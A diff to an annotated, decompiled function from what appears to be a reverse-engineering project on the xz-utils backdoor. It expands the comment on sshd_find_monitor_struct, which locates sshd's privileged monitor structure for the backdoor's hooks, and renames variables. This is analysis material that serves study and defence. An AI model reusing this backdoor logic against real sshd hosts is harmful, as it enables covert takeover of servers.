@@ -5,7 +5,11 @@
 
 
 /*
- * AutoDoc: Collects monitor field references across multiple sshd routines, tallies the overlapping addresses, and picks the consensus location of `struct monitor`. Stage two writes that pointer into the global context so the mm_* hooks can reach sshd's privileged monitor state.
+ * AutoDoc: Calls `sshd_find_monitor_field_addr_in_function` across ten monitor-related routines
+ * (accept/recv/send helpers, channel handlers, etc.), tallies how many times each BSS address
+ * shows up, and picks the consensus pointer when at least five hits agree. The winner is stored
+ * in `ctx->struct_monitor_ptr_address` so later hooks can dereference monitor->m_sendfd/m_recvfd
+ * directly.
  */
 #include "xzre_types.h"
 
@@ -15,8 +19,8 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
 {
   u8 *code_start;
   BOOL BVar1;
-  u8 *data_start;
-  u8 *data_end;
+  u8 *data_start_00;
+  u8 *data_end_00;
   ulong uVar2;
   uint uVar3;
   long lVar4;
@@ -25,6 +29,10 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
   void **ppvVar7;
   uint *puVar8;
   byte bVar9;
+  void *monitor_candidates [10];
+  uint monitor_field_hits [10];
+  u8 *data_start;
+  u8 *data_end;
   u64 local_d0;
   uint local_c8 [20];
   void *local_78 [10];
@@ -33,10 +41,10 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
   BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,0);
   if ((BVar1 != 0) && (local_d0 = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
     ctx->struct_monitor_ptr_address = (monitor **)0x0;
-    data_start = (u8 *)elf_get_data_segment(elf,&local_d0,0);
-    if (data_start != (u8 *)0x0) {
+    data_start_00 = (u8 *)elf_get_data_segment(elf,&local_d0,0);
+    if (data_start_00 != (u8 *)0x0) {
       lVar6 = 0;
-      data_end = data_start + local_d0;
+      data_end_00 = data_start_00 + local_d0;
       local_c8[0] = 4;
       local_c8[1] = 5;
       local_c8[2] = 6;
@@ -56,8 +64,8 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
         code_start = (u8 *)refs->entries[local_c8[lVar6]].func_start;
         if (code_start != (u8 *)0x0) {
           sshd_find_monitor_field_addr_in_function
-                    (code_start,(u8 *)refs->entries[local_c8[lVar6]].func_end,data_start,data_end,
-                     local_78 + lVar6,ctx);
+                    (code_start,(u8 *)refs->entries[local_c8[lVar6]].func_end,data_start_00,
+                     data_end_00,local_78 + lVar6,ctx);
         }
         lVar6 = lVar6 + 1;
       } while (lVar6 != 10);
